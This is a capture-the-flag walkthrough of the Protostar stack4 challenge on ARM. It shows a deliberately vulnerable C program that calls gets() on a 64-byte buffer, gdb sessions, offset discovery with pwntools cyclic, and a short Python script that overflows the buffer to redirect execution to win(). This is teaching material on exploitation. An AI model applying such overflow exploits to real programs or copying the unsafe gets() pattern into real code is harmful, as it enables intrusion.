## Protostar ARM ./stack4

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
#### _Let's start_
As in the previous challenge our goal is to call the `win()` function. The data used to jump to the win function will be the user input.

Let's compile
```c
gcc -g -fno-stack-protector -z execstack -no-pie -o stack4 stack4.c
```

and open the binary with gdb and look to the `win()` function and its address

```c
pi@raspberrypi:~/protostar/stack4 $ gdb ./stack4

...

Reading symbols from ./stack4...done.
gef➤  print win
$1 = {void ()} 0x10434 <win>
gef➤  

```

We have the address of the win() function we can set a breakpoint right after the `gets()` function returns `(0x00010470)` or `(0x00010474)`, we can inspect the status.
.

```c
gef➤  disassemble main
Dump of assembler code for function main:
   0x00010450 <+0>:	push	{r11, lr}
   0x00010454 <+4>:	add	r11, sp, #4
   0x00010458 <+8>:	sub	sp, sp, #72	; 0x48
   0x0001045c <+12>:	str	r0, [r11, #-72]	; 0xffffffb8
   0x00010460 <+16>:	str	r1, [r11, #-76]	; 0xffffffb4
   0x00010464 <+20>:	sub	r3, r11, #68	; 0x44
   0x00010468 <+24>:	mov	r0, r3
   0x0001046c <+28>:	bl	0x10308 <gets@plt>
   0x00010470 <+32>:	mov	r3, #0
   0x00010474 <+36>:	mov	r0, r3
   0x00010478 <+40>:	sub	sp, r11, #4
   0x0001047c <+44>:	pop	{r11, pc}
End of assembler dump
gef➤  b *0x00010470
Breakpoint 1 at 0x10470: file stack4.c, line 12.

```

In this challenge I will use `pwn cyclic` from `pwntools` to solve it, `pwn cyclic 80` for example will generate an unique string of 80 chars.  
Let's generate our string which we will us as user input
```c
pi@raspberrypi:~/protostar/stack4 $ pwn cyclic 80
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
```
Once we have the string we can go ahead with out analysis on `gdb`

```c
Breakpoint 1 at 0x10470: file stack4.c, line 12.
gef➤  r
Starting program: /home/pi/protostar/stack4/stack4
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa

Breakpoint 1, 0x00010470 in main (argc=0x1, argv=0x7efff594) at stack4.c:12
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x7efff400  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r1  : 0x0       
$r2  : 0x1       
$r3  : 0x0       
$r4  : 0x0       
$r5  : 0x00010480  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
$r6  : 0x00010344  →  <_start+0> mov r11,  #0
$r7  : 0x0       
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x76fff000  →  0x00030f44  →  0x00000000
$r11 : 0x7efff444  →  "raaasaaataaa"
$r12 : 0xfbad2288
$sp  : 0x7efff3f8  →  0x7efff594  →  0x7efff6e1  →  "/home/pi/protostar/stack4/stack4"
$lr  : 0x61616174 ("taaa"?)
$pc  : 0x00010470  →  <main+32> mov r3,  #0
$cpsr: [negative ZERO CARRY overflow interrupt fast thumb]
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7efff3f8│+0x0000: 0x7efff594  →  0x7efff6e1  →  "/home/pi/protostar/stack4/stack4"	 ← $sp
0x7efff3fc│+0x0004: 0x00000001
0x7efff400│+0x0008: "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"	 ← $r0
0x7efff404│+0x000c: "baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaana[...]"
0x7efff408│+0x0010: "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"
0x7efff40c│+0x0014: "daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapa[...]"
0x7efff410│+0x0018: "eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqa[...]"
0x7efff414│+0x001c: "faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara[...]"
───────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
      0x10464 <main+20>        sub    r3,  r11,  #68	; 0x44
      0x10468 <main+24>        mov    r0,  r3
      0x1046c <main+28>        bl     0x10308 <gets@plt>
 →    0x10470 <main+32>        mov    r3,  #0
      0x10474 <main+36>        mov    r0,  r3
      0x10478 <main+40>        sub    sp,  r11,  #4
      0x1047c <main+44>        pop    {r11,  pc}
      0x10480 <__libc_csu_init+0> push   {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
      0x10484 <__libc_csu_init+4> mov    r7,  r0
─────────────────────────────────────────────────────────────────────────────────────────── source:stack4.c+12 ────
      7	 
      8	 int main(int argc, char **argv)
      9	 {
     10	   char buffer[64];
     11	 
           // buffer=0x7efff400  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
 →   12	   gets(buffer);
     13	 
     14	 
     15	 }
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack4", stopped 0x10470 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x10470 → main(argc=0x1, argv=0x7efff594)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/60x $sp
0x7efff3f8:	0x7efff594	0x00000001	0x61616161	0x61616162
0x7efff408:	0x61616163	0x61616164	0x61616165	0x61616166
0x7efff418:	0x61616167	0x61616168	0x61616169	0x6161616a
0x7efff428:	0x6161616b	0x6161616c	0x6161616d	0x6161616e
0x7efff438:	0x6161616f	0x61616170	0x61616171	0x61616172
0x7efff448:	0x61616173	0x61616174	0x00000000	0x00010450
0x7efff458:	0xe06e74c1	0xe879a65d	0x00000000	0x00010480
0x7efff468:	0x00010344	0x00000000	0x00000000	0x00000000
0x7efff478:	0x76fff000	0x00000000	0x00000000	0x00000000
0x7efff488:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff498:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff4a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff4b8:	0x00000000	0x00000000	0x00000001	0x76fff978
0x7efff4c8:	0x76fffb34	0x00000000	0x76fd879c	0x7efff594
0x7efff4d8:	0x7efff59c	0x76ffe964	0x00000000	0x76fff000
```

Inspecting the stack we can see our string starts in `0x7efff400` and ends in `0x7efff44f`. We can continue the execution

```c
gef➤  c
Continuing.

Program received signal SIGBUS, Bus error.
0x61616172 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0       
$r1  : 0x0       
$r2  : 0x1       
$r3  : 0x0       
$r4  : 0x0       
$r5  : 0x00010480  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
$r6  : 0x00010344  →  <_start+0> mov r11,  #0
$r7  : 0x0       
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x76fff000  →  0x00030f44  →  0x00000000
$r11 : 0x61616171 ("qaaa"?)
$r12 : 0xfbad2288
$sp  : 0x7efff448  →  "saaataaa"
$lr  : 0x61616174 ("taaa"?)
$pc  : 0x61616172 ("raaa"?)
$cpsr: [negative ZERO CARRY overflow interrupt fast thumb]
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7efff448│+0x0000: "saaataaa"	 ← $sp
0x7efff44c│+0x0004: "taaa"
0x7efff450│+0x0008: 0x00000000
0x7efff454│+0x000c: 0x00010450  →  <main+0> push {r11,  lr}
0x7efff458│+0x0010: 0x185cc732
0x7efff45c│+0x0014: 0x104b15ae
0x7efff460│+0x0018: 0x00000000
0x7efff464│+0x001c: 0x00010480  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
───────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616172
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
```

and we can see the message

```c
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616172
```

Inspecting the program counter, we can notice it has the value `0x61616172 --> to ASCII--> aaar --> to Big Endian --> raaa` from our input string. The program crashed trying to execute from this address.  
Before calculating the offset we should know that an ARM processor can operate in two modes, `ARM` or `Thumb`.  
When a processor encounters a jump instruction to an address, the `LSB (Least Significant Bit)` will be checked.

```code
if (LSB == 0):
  ARM_Mode
else:
  THUMB_Mode
```
So, jumping to either `0x61616172` or `0x61616173` would result in the program counter `($pc)` to `0x61616172`, but with the only difference that the `CPU` is in `ARM` or `Thumb` mode.

We can determine this by inspecting the stack just analyzing the instruction ` 0x0001047c <+44>:	pop	{r11, pc}`.  
Let's set a new breakpoint on ` 0x0001047c <+44>:	pop	{r11, pc}` (we can remove the old one using the command `delete breakpoint`)and run the program again.

```c
───────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
      0x10470 <main+32>        mov    r3,  #0
      0x10474 <main+36>        mov    r0,  r3
      0x10478 <main+40>        sub    sp,  r11,  #4
 →    0x1047c <main+44>        pop    {r11,  pc}
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────── source:stack4.c+13 ────
      8	 int main(int argc, char **argv)
      9	 {
     10	   char buffer[64];
     11	 
     12	   gets(buffer);
 →   13	 
     14	 
     15	 }
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack4", stopped 0x1047c in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x1047c → main(argc=0x1, argv=0x7efff594)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/24x $sp
0x7efff440:	0x61616171	0x61616172	0x61616173	0x61616174
0x7efff450:	0x00000000	0x00010450	0xcaff2b3c	0xc2e8f9a0
0x7efff460:	0x00000000	0x00010480	0x00010344	0x00000000
0x7efff470:	0x00000000	0x00000000	0x76fff000	0x00000000
0x7efff480:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff490:	0x00000000	0x00000000	0x00000000	0x00000000
```
`pop {r11, pc}` instruction will pop two elements from the stack and store them in `r11` and `pc`.  
`r11 = 0x61616171`  
`$pc = 0x61616172`

Once that we are sure about `pc` value, we can use `pwn cyclic -l <pc>` to find the offset.

```
pi@raspberrypi:~/protostar/stack4 $ pwn cyclic -l 0x61616172
68
```

```Python
import struct

padding  = 'A' * 68
address_win = 0x10434

print padding + struct.pack('<I', address_win)

```

and run it

```code
pi@raspberrypi:~/protostar/stack4 $ python check.py | ./stack4
code flow successfully changed
```

**_Done :)_**
